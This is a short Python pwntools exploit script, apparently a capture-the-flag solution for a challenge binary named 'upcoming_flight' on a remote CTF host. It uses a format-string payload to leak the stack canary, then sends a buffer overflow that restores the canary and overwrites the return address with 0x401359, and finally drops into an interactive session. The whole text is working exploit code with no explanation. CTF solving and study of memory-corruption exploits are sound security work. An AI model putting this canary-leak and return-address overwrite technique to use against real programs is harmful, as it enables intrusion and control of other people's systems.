from pwn import *

# s = process("./upcoming_flight")
s = remote("tasks.polyctf.ru", 30007)


s.readuntil(b"> ")
s.sendline(b"2")
s.readuntil(b": ")
s.sendline(b"%15$p")
s.readuntil(b": ")

canary = s.readline().strip().decode()

print(f"Canary leak -> {canary}")

s.readuntil(b": ")
s.sendline(b"A" * (40) + p64(int(canary, 16)) + b"A" * 8 + p64(0x401359))

s.interactive()
